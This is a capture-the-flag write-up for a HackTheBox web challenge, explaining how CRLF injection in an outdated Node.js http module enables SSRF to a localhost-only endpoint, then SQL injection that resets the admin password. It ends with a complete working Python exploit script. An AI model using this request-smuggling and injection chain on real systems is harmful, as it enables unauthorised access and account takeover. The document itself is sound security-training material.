# Writeup for Weather App (Web Challenge from HackTheBox)

> Multiple bugs had to be chained in order to obtain the flag. Here's a brief summary:

* HTTP request splitting (CRFL Injection) on POST request at /api/weather in the "endpoint" parameter.
* Exploit the request splitting to perform an SSRF.
* POST request to /register endpoint is only possible as localhost, so utilize the SSRF to make the request.
* The register form is vulnerable to SQL Injection. Exploit it to change admin password.
* Login as admin to obtain the flag.

> Writeup:

## Code Review

Looking at the code, I found these endpoints:
 * /login
 * /register
 * /api/weather

This part of the code handles the POST request on the login page.
```js
router.post('/login', (req, res) => {
    let {
        username,
        password
    } = req.body;

    if (username && password) {
        return db.isAdmin(username, password)
            .then(admin => {
                if (admin) return res.send(fs.readFileSync('./flag').toString());
                return res.send(response('You are not admin'));
            })
            .catch((e) => res.send(response(e.message)));
    }

    return re.send(response('Missing parameters'));
});
```
Apparantly, logging in as admin would give us the flag. There is an 'isAdmin' function that takes our username and password inputs as arguments and checks if we're admin or not. So, I checked the code for this function in database.js file.

```js
async isAdmin(user, pass) {
        return new Promise(async (resolve, reject) => {
            try {
                let smt = await this.db.prepare('SELECT username FROM users WHERE username = ? and password = ?');
                let row = await smt.get(user, pass);
                resolve(row !== undefined ? row.username == 'admin' : false);
            } catch (e) {
                reject(e);
                }
        });
}
```

It just searches for a row in 'users' table with the username and password that we provide. If it finds a row matching the values we gave, it checks if the username is 'admin' or not and returns true/false. In the same file, I also found that an admin account gets created with a randomized password at start. So, I thought there must be an SQL Injection somewhere. Then I looked at the code for registration in the same file.
```js
  async register(user, pass) {
        return new Promise(async (resolve, reject) => {
            try {
                let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
                resolve((await this.db.run(query)));
            } catch (e) {
                reject(e);
            }
        });
    }
   ```
This is it. It seemed to be vulnerable to SQLi since, the username and password we provide had not been filtered and was directly appended to the query which means we can inject our own SQL queries into it. However, in order to register a new account we had to send the POST request locally.
```js
router.post('/register', (req, res) => {
    if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
        return res.status(401).end();
    }
    let {
        username,
        password
    } = req.body;

    if (username && password) {
        return db.register(username, password)
            .then(() => res.send(response('Successfully registered')))
            .catch((err) => {
                res.send(response(err.message))
            });
    }

    return res.send(response('Missing parameters'));
});
```
As we can see here, when we send a POST request to /register, it checks our IP and only allows registration if it's sent from localhost. So, we need to find an SSRF to make this request.

Now, looking at the code for /api/weather endpoint, I found that it calls 'getWeather' function by passing our POST data as it's arguments
```js
return WeatherHelper.getWeather(res, endpoint, city, country);
```

So, I took a look at the getWeather function in WeatherHelper.js file. Here, I saw this line of code
```js
let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`); 
```
After looking at the code for 'HttpGet' function, I found that it uses the 'http' module to send a GET request to the provided argument. Clearly, we can utilize this function to perform an SSRF attack since we can control the 'endpoint' parameter. However, we can only send GET requests using this API whereas, our goal is to send a POST request to /register. So, I got stuck at this point for a while. I later realized that this was not the latest version of NodeJS. I searched for some vulnerabilities in this version of Node and found that I could perform CRLF injection in 'get' function of the http module. So, now this can be exploited to smuggle a POST request to /register.

Keeping all these things in mind, here's a python code I wrote to change the admin password:
```py
import requests as r

sp="\u0120" # Space
rn="\u010D"+"\u010A" # \r\n

# Exploiting SQL Injection on registration to UPDATE the password of admin
# Register a new user with username "admin" and password "a') ON CONFLICT (username) DO UPDATE password='password' -- "
# Since, admin username already exists, it'll create a conflict and our injected code will get executed and updates the admin password to 'password'
username="admin"
passwordPayload="a%27)"+sp+"ON"+sp+"CONFLICT"+sp+"(username)"+sp+"DO"+sp+"UPDATE"+sp+"SET"+sp+"password=%27password%27;"+sp+"--"+sp 

postData=f"username={username}&password={passwordPayload}"

# Injecting CRLF on "endpoint" parameter to smuggle a POST request to /register with postData 
data={
    "endpoint":f"127.0.0.1/{sp}HTTP/1.1{rn}Host:{sp}127.0.0.1{rn}{rn}POST{sp}/register{sp}HTTP/1.1{rn}Host:{sp}127.0.0.1{rn}Content-Type:{sp}application/x-www-form-urlencoded{rn}Content-Length:{sp}{str(len(postData))}{rn}{rn}{postData}{rn}{rn}GET{sp}",
    "city":"Kathmandu",
    "country":"NP"
}
r.post("http://159.65.92.208:30533/api/weather",data=data)
```

Then, I logged in with username 'admin' and password 'password' and got the flag :)
